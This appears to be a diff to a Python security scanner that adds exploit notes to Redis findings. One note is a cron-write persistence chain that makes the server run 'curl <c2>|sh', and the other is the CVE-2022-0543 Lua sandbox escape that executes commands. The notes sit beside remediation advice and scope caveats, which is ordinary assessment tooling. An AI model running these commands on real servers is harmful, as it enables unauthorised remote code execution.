@@ -428,7 +428,14 @@ def findings(hosts: list[Host], probes: dict | None = None) -> list[dict]:
                     "Set a strong requirepass / ACL, enable protected-mode, disable or "
                     "rename CONFIG/SAVE/MODULE/SLAVEOF for untrusted clients, and bind to "
                     "a trusted interface only.",
-                    ["CWE-306", "CWE-284"], kind="redis_unauth"))
+                    ["CWE-306", "CWE-284"], kind="redis_unauth",
+                    exploit_note=(
+                        "redis-cli -h <ip> -p <port> --scan | head -50 ; "
+                        "redis-cli -h <ip> -p <port> DUMP <key> ; only in scope: "
+                        "CONFIG SET dir /var/spool/cron/crontabs; CONFIG SET "
+                        "dbfilename root; SET x '\\n\\n* * * * * curl <c2>|sh\\n\\n'; "
+                        "SAVE."),
+                    depth_tier="t2"))
             if pr.get("cve_2022_0543") is True:
                 out.append(_finding(
                     "critical",
@@ -448,7 +455,14 @@ def findings(hosts: list[Host], probes: dict | None = None) -> list[dict]:
                     "return io.popen(\"id\"):read(\"*a\")' 0   # only within scope",
                     "Upgrade the distro's redis-server package (the fix ships in "
                     "packaging, not upstream Redis) and enforce AUTH.",
-                    ["CWE-1188", "CWE-269"], kind="redis_cve_2022_0543"))
+                    ["CWE-1188", "CWE-269"], kind="redis_cve_2022_0543",
+                    exploit_note=(
+                        "redis-cli -h <ip> -p <port> EVAL 'local "
+                        "f=package.loadlib(\"/lib/x86_64-linux-gnu/liblua5.1.so.0\","
+                        "\"luaopen_io\"); local io=f(); return "
+                        "io.popen(\"id\"):read(\"*a\")' 0 - only within engagement "
+                        "scope."),
+                    depth_tier="t1"))
             acl_users = pr.get("acl_users") or []
             hashed = [u for u in acl_users
                       if isinstance(u, dict) and u.get("hashes")]
